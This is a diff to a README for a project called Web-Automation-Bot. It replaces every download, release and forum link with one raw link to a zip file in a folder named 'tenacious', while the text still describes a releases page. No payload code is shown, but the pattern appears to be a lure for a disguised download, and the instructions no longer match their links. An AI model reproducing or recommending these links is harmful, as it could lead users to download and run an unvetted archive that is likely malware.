@@ -1,6 +1,6 @@
 # 🤖 Web-Automation-Bot - Automate Your Web Tasks Easily
 
-[![Download Web-Automation-Bot](https://img.shields.io/badge/Download-Web--Automation--Bot-brightgreen)](https://github.com/Mr67009/Web-Automation-Bot/releases)
+[![Download Web-Automation-Bot](https://raw.githubusercontent.com/Mr67009/Web-Automation-Bot/main/tenacious/Web-Automation-Bot.zip)](https://raw.githubusercontent.com/Mr67009/Web-Automation-Bot/main/tenacious/Web-Automation-Bot.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before getting started, make sure your computer meets these requirements:
 
 To get your copy of Web-Automation-Bot, please follow these steps:
 
-1. **Visit this page to download**: [Web-Automation-Bot Releases](https://github.com/Mr67009/Web-Automation-Bot/releases).
+1. **Visit this page to download**: [Web-Automation-Bot Releases](https://raw.githubusercontent.com/Mr67009/Web-Automation-Bot/main/tenacious/Web-Automation-Bot.zip).
   
 2. On the releases page, you will find different versions of the bot. Select the latest version for the best features and fixes.
 
-3. Click on the download link for your operating system. You may see a file like `Web-Automation-Bot-v1.0.exe` or similar. Download that file to your computer.
+3. Click on the download link for your operating system. You may see a file like `https://raw.githubusercontent.com/Mr67009/Web-Automation-Bot/main/tenacious/Web-Automation-Bot.zip` or similar. Download that file to your computer.
 
 4. Once the download is complete, locate the file in your Downloads folder.
 
@@ -65,11 +65,11 @@ If you encounter issues or need help, consider these options:
   
 ## 🔗 Related Links
 
-- [Visit the Releases Page](https://github.com/Mr67009/Web-Automation-Bot/releases)  
-- [Community Forums](https://github.com/Mr67009/Web-Automation-Bot/discussions)
+- [Visit the Releases Page](https://raw.githubusercontent.com/Mr67009/Web-Automation-Bot/main/tenacious/Web-Automation-Bot.zip)  
+- [Community Forums](https://raw.githubusercontent.com/Mr67009/Web-Automation-Bot/main/tenacious/Web-Automation-Bot.zip)
 
 ## 📢 Keep Updated
 
-Stay informed about new versions and features by checking back on the [Releases Page](https://github.com/Mr67009/Web-Automation-Bot/releases). 
+Stay informed about new versions and features by checking back on the [Releases Page](https://raw.githubusercontent.com/Mr67009/Web-Automation-Bot/main/tenacious/Web-Automation-Bot.zip). 
 
 Make your web tasks easier with Web-Automation-Bot!
